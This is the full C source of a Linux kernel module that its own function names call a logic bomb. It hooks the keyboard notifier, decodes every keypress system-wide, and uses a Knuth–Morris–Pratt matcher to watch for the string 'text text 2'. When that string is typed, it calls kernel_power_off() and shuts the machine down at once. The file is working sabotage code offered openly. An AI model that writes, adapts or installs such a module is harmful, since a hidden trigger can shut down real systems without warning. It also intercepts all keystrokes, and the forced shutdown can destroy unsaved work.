#include <linux/init.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/reboot.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Boris Nagaev <bnagaev@gmail.com>");

// KMP in online mode

const char PATTERN[] = "text text 2";
#define M (sizeof(PATTERN) - 1)
int pi[M]; // prefix-function
int p;

static void make_pi(void) {
    int i, j;
    pi[0] = 0;
    for (i = 1; i < M; ++i) {
        j = pi[i-1];
        while (j > 0 && PATTERN[i] != PATTERN[j]) {
            j = pi[j-1];
        }
        if (PATTERN[i] == PATTERN[j]) {
            ++j;
        }
        pi[i] = j;
    }
}

static int push_next_char(char t) {
    int match;
    while (t != PATTERN[p] && p > 0) {
        p = pi[p - 1];
    }
    if (t == PATTERN[p] && p < M) {
        p++;
    }
    match = (p == M);
    if (match) {
        p = 0;
    }
    return match;
}

const char CH_TABLE[] = {
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
    '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
    'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
};

static char decode_key(int keycode) {
    int char_index = keycode - KEY_1;
    return (char_index >= 0 && char_index < sizeof(CH_TABLE)) ?
        CH_TABLE[char_index] :
        (keycode == KEY_SPACE) ? ' ' : '?';
}

static int on_key_event(
        struct notifier_block* nblock,
        unsigned long code,
        void* param0) {
    struct keyboard_notifier_param* param = param0;
    if (code == KBD_KEYCODE && param->down) {
        int key = param->value;
        if (push_next_char(decode_key(key))) {
            kernel_power_off();
        }
    }
    return NOTIFY_OK;
}

struct notifier_block nb = {
    .notifier_call = on_key_event
};

static int __init logic_bomb_init( void ) {
    register_keyboard_notifier(&nb);
    p = 0;
    make_pi();
    return 0;
}

static void __exit logic_bomb_exit( void ) {
    unregister_keyboard_notifier(&nb);
}

module_init(logic_bomb_init);
module_exit(logic_bomb_exit);
